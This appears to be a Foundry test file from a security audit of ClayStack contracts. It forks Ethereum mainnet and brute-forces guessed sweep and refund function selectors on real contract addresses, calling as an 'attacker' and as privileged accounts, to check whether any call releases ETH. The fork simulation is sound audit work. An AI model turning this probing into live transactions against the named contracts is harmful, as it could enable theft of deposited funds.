// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

/// @title H-07 — exhaustive probe: can ANY caller make clayMain release ETH?
/// Brute-forces the candidate "sweep/refund" selectors with plausible argument
/// shapes and records success + ETH destination. Read-only fork simulation.
contract ClayStackH07MatrixTest is Test {
    address constant CLAYMAIN = 0x331312DAbaf3d69138c047AaC278c9f9e0E8FFf8;
    address constant CLAYMAIN2 = 0x87393BE8ac323F2E63520A6184e5A8A9CC9fC051;
    address constant EXECUTOR = 0x4c06A181EDAfE572c44aB2a818B625a927484519;
    address constant ADMIN_EOA = 0xa72DF45A431B12EF4E37493D2bCf3D19Af3D24FA;
    address constant IMPL_CREATOR = 0x31f5E9E03785B290E0d12A0eeFcAE3264E8c53f2;
    address constant TIMELOCK = 0x7a1104Feb0D460Aa437008e54D7D6Db0bA7e8876;
    address constant TIMELOCK_UPGRADES = 0x376b467dFf007dD8d3f24404cAddff7F72257Fe4;
    address constant MGR_6570 = 0x657010E159dEb03617519069Db7D7c1A8297aCE4;
    address constant PROXYADMIN = 0x084A0738A29a3Bfc233D3cb318FF7B63d97d49e4;

    address attacker = address(0xCAFE);
    uint256 snapshot;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        vm.deal(attacker, 100 ether);
    }

    function _try(address actor, address target, bytes memory data, string memory label) internal returns (bool ok) {
        uint256 balMain = target.balance;
        uint256 balAdmin = ADMIN_EOA.balance;
        uint256 balAtt = attacker.balance;
        vm.prank(actor);
        (ok, ) = target.call(data);
        if (target.balance != balMain || ADMIN_EOA.balance != balAdmin || attacker.balance != balAtt) {
            emit log_named_string(string.concat("VALUE MOVED: ", label), "!!!");
            emit log_named_decimal_uint("  target bal delta", balMain - target.balance, 18);
            emit log_named_decimal_uint("  admin bal delta", ADMIN_EOA.balance - balAdmin, 18);
            emit log_named_decimal_uint("  actor bal delta", attacker.balance - balAtt, 18);
        }
        return ok;
    }

    function test_h07_matrix_sweep() public {
        address[6] memory actors = [attacker, ADMIN_EOA, EXECUTOR, IMPL_CREATOR, MGR_6570, TIMELOCK_UPGRADES];
        string[6] memory names = ["attacker", "admin", "executor", "implCreator", "mgr6570", "timelockUp"];
        // 0x8c84497d variants: (address,uint256) with uint = 0 / 0x20 / 0x40 / 0x60
        uint256[4] memory vals = [uint256(0), 0x20, 0x40, 0x60];
        for (uint256 a = 0; a < 6; a++) {
            for (uint256 v = 0; v < 4; v++) {
                bool ok = _try(
                    actors[a],
                    CLAYMAIN,
                    abi.encodeWithSelector(0x8c84497d, attacker, vals[v]),
                    string.concat("8c84497d(", names[a], ",", vm.toString(vals[v]), ")")
                );
                if (ok) emit log_named_string(string.concat("8c84497d ok as ", names[a], " v=", vm.toString(vals[v])), "YES");
            }
        }
        // 0xe0c30834 (address,uint256): refund-shaped
        for (uint256 a = 0; a < 6; a++) {
            for (uint256 v = 0; v < 4; v++) {
                bool ok = _try(
                    actors[a], CLAYMAIN,
                    abi.encodeWithSelector(0xe0c30834, attacker, vals[v]),
                    string.concat("e0c30834(", names[a], ")")
                );
                if (ok) emit log_named_string(string.concat("e0c30834 ok as ", names[a], " v=", vm.toString(vals[v])), "YES");
            }
        }
        // 0xf3314a61(address)
        for (uint256 a = 0; a < 6; a++) {
            bool ok = _try(actors[a], CLAYMAIN, abi.encodeWithSelector(0xf3314a61, attacker),
                string.concat("f3314a61(", names[a], ")"));
            if (ok) emit log_named_string(string.concat("f3314a61 ok as ", names[a]), "YES");
        }
        // 0x753d02bd(address)
        for (uint256 a = 0; a < 6; a++) {
            bool ok = _try(actors[a], CLAYMAIN, abi.encodeWithSelector(0x753d02bd, attacker),
                string.concat("753d02bd(", names[a], ")"));
            if (ok) emit log_named_string(string.concat("753d02bd ok as ", names[a]), "YES");
        }
        // 0x42294bb0(address,uint256,uint256)
        for (uint256 a = 0; a < 6; a++) {
            bool ok = _try(actors[a], CLAYMAIN, abi.encodeWithSelector(0x42294bb0, attacker, uint256(0), uint256(0)),
                string.concat("42294bb0(", names[a], ")"));
            if (ok) emit log_named_string(string.concat("42294bb0 ok as ", names[a]), "YES");
        }
        // 0x9eb6ef66(address,address)
        for (uint256 a = 0; a < 6; a++) {
            bool ok = _try(actors[a], CLAYMAIN, abi.encodeWithSelector(0x9eb6ef66, CLAYMAIN, attacker),
                string.concat("9eb6ef66(", names[a], ")"));
            if (ok) emit log_named_string(string.concat("9eb6ef66 ok as ", names[a]), "YES");
        }
        emit log_named_decimal_uint("clayMain ETH final", CLAYMAIN.balance, 18);
        emit log_named_decimal_uint("attacker ETH final", attacker.balance, 18);
    }

    function test_h07_matrix_executor() public {
        address[4] memory actors = [attacker, PROXYADMIN, IMPL_CREATOR, MGR_6570];
        string[4] memory names = ["attacker", "proxyadmin", "implCreator", "mgr6570"];
        for (uint256 a = 0; a < 4; a++) {
            // admin path selector 0x278f7943 with (address,bytes) and (address)
            bool ok1 = _try(actors[a], EXECUTOR, abi.encodeWithSelector(0x278f7943, address(this), ""),
                string.concat("278f7943(addr,bytes) ", names[a]));
            bool ok2 = _try(actors[a], EXECUTOR, abi.encodeWithSelector(0x278f7943, address(this)),
                string.concat("278f7943(addr) ", names[a]));
            if (ok1) emit log_named_string(string.concat("278f7943(addr,bytes) ok as ", names[a]), "YES");
            if (ok2) emit log_named_string(string.concat("278f7943(addr) ok as ", names[a]), "YES");
        }
    }
}

// appended: sweep with token-address args
contract ClayStackH07MatrixTokenTest is Test {
    address constant CLAYMAIN = 0x331312DAbaf3d69138c047AaC278c9f9e0E8FFf8;
    address constant CLAYMAIN2 = 0x87393BE8ac323F2E63520A6184e5A8A9CC9fC051;
    address constant EXECUTOR = 0x4c06A181EDAfE572c44aB2a818B625a927484519;
    address constant ADMIN_EOA = 0xa72DF45A431B12EF4E37493D2bCf3D19Af3D24FA;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CSETH = 0x5d74468b69073f809D4FaE90AfeC439e69Bf6263;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address attacker = address(0xCAFE);

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        vm.deal(attacker, 100 ether);
    }

    function test_h07_sweep_token_args() public {
        address[4] memory toks = [WETH, CSETH, USDC, CLAYMAIN];
        address[4] memory actors = [attacker, ADMIN_EOA, EXECUTOR, address(this)];
        for (uint256 t = 0; t < 4; t++) {
            for (uint256 a = 0; a < 4; a++) {
                uint256 balMain = CLAYMAIN.balance;
                vm.prank(actors[a]);
                (bool ok, ) = CLAYMAIN.call(abi.encodeWithSelector(0x8c84497d, toks[t], uint256(0x40)));
                if (ok || CLAYMAIN.balance != balMain) {
                    emit log_named_string(
                        string.concat("8c84497d(token=", vm.toString(toks[t]), " actor=", vm.toString(a), ")"),
                        ok ? "OK" : "revert");
                    emit log_named_decimal_uint("  clayMain bal delta", balMain - CLAYMAIN.balance, 18);
                    emit log_named_decimal_uint("  admin bal", ADMIN_EOA.balance, 18);
                }
            }
        }
        emit log_named_decimal_uint("final clayMain ETH", CLAYMAIN.balance, 18);
        emit log_named_decimal_uint("final clayMain2 ETH", CLAYMAIN2.balance, 18);
    }
}
